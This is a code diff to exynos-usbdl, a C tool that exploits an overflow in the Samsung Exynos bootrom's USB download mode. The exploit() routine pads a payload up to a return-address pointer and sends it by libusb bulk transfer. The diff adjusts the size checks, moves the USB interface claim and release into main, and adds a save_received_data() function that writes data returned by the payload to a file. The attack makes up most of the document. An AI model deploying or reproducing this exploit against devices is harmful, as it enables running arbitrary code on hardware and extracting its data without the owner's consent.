@@ -1,6 +1,5 @@
-/* -*- Mode: C; indent-tabs-mode:t ; c-basic-offset:8 -*- */
 /* exynos-usbdl - github.com/frederic/exynos-usbdl
- * 
+ * SPDX-License-Identifier: GPL-3.0-or-later
  */
 
 #include <stdlib.h>
@@ -37,7 +36,7 @@ static uint32_t targets[][2] = {
 
 libusb_device_handle *handle = NULL;
 
-#define MAX_PAYLOAD_SIZE	(BLOCK_SIZE - 10)//TODO bug, we should be able to reach 0xffff
+#define MAX_PAYLOAD_SIZE	(BLOCK_SIZE - 10)
 typedef struct __attribute__ ((__packed__)) dldata_s {
 	u_int32_t unk0;
 	u_int32_t size;// header(8) + data(n) + footer(2)
@@ -67,8 +66,8 @@ static int exploit(dldata_t *payload, int target_id) {
 	dprint("padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER] = 0x%x\n", padding_size);
 	uint32_t original_payload_size = payload->size;
 	dprint("original_payload_size = 0x%x\n", original_payload_size);
-	if(original_payload_size > 0xffff)//maximum size of first bulk transfer
-		printf("ERROR : original_payload_size > 0xffff\n");
+	if(original_payload_size > BLOCK_SIZE)//maximum size of first bulk transfer
+		printf("ERROR : original_payload_size > BLOCK_SIZE\n");
 	padding_size -= original_payload_size;//leading padding replaced with payload
 	padding_size += sizeof(payload->unk0) + sizeof(payload->size);//header is skipped, so we have to compensate with more padding
 	dprint("new padding_size = 0x%x\n", padding_size);
@@ -102,12 +101,6 @@ static int exploit(dldata_t *payload, int target_id) {
 		printf("ERROR : min_size_to_overflw > payload->size\n");
 
 	// step 3 : usb communication
-	rc = libusb_claim_interface(handle, 0);
-	if(rc) {
-		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
-		return rc;
-	}
-
 	printf("- exploit: sending payload...\n");
 	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t*)payload, original_payload_size, &transferred, 0);
 	if(rc) {
@@ -170,8 +163,6 @@ static int exploit(dldata_t *payload, int target_id) {
 	}
 	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
 	printf("- exploit: done.\n");
-	sleep(5);
-	libusb_release_interface(handle, 0);
 
 	return rc;
 }
@@ -208,6 +199,27 @@ static int identify_target()
 	return -1;
 }
 
+static int save_received_data(const char *filename){
+	FILE *fd;
+	int transferred = 0;
+	uint8_t buf[BLOCK_SIZE];
+
+	fd = fopen(filename,"wb");
+	if (fd == NULL) {
+		perror("Can't open output file!\n");
+		return -1;
+	}
+
+	do {
+		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
+		fwrite(buf, 1, transferred, fd);
+	} while(transferred);
+
+	fclose(fd);
+
+	return 0;
+}
+
 int main(int argc, char *argv[])
 {
 	libusb_context *ctx;
@@ -217,9 +229,10 @@ int main(int argc, char *argv[])
 	int target_id = -1;
 	int rc;
 
-	if (argc != 2) {
-		printf("Usage: %s <input_file>\n", argv[0]);
+	if (!(argc == 2 || argc == 3)) {
+		printf("Usage: %s <input_file> [<output_file>]\n", argv[0]);
 		printf("\tinput_file: payload binary to load and execute\n");
+		printf("\toutput_file: file to write data returned by payload\n");
 		exit(-1);
 	}
 
@@ -265,7 +278,21 @@ int main(int argc, char *argv[])
 
 	target_id = identify_target();
 
+	rc = libusb_claim_interface(handle, 0);
+	if(rc) {
+		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
+		return rc;
+	}
+
 	exploit(&payload, target_id);
+
+	if(argv[2])
+		save_received_data(argv[2]);
+
+	#if DEBUG
+	sleep(5);
+	#endif
+	libusb_release_interface(handle, 0);
 
 	if (handle) {
 		libusb_close (handle);
